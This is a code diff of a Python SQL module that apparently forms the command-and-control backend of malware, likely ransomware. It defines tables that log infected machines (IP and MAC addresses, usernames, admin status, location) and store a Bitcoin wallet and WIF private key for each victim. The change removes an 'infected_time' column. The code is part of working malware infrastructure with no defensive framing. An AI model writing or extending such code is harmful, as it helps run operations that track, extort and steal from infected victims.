@@ -25,7 +25,7 @@ def create_tables():
     logger.info("Creating tables")
     connection = create_connection()
     cursor = connection.cursor()
-    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL,`location` VARCHAR(150) DEFAULT NULL,`infected_time` DATETIME DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
+    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL,`location` VARCHAR(150) DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
     cursor.execute(statistics_table)
     bitcoin_details = """CREATE TABLE IF NOT EXISTS `bitcoin_details` (`client_id` VARCHAR(100) NOT NULL,`wallet_address` VARCHAR(1000) NOT NULL,`public_key` VARCHAR(1000) NOT NULL,`wif_private_key` VARCHAR(1000) NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`,`wallet_address`));"""
     cursor.execute(bitcoin_details)
@@ -50,7 +50,7 @@ def insert_statistics_to_database(statistics):
     logger.info("Inserting statistics into database")
     connection = create_connection()
     cursor = connection.cursor()
-    statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin, location, infected_time) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin, :location, :infected_time);"
+    statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin, location) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin, :location);"
     cursor.execute(statistics_insert_query, statistics)
     connection.commit()
     connection.close()
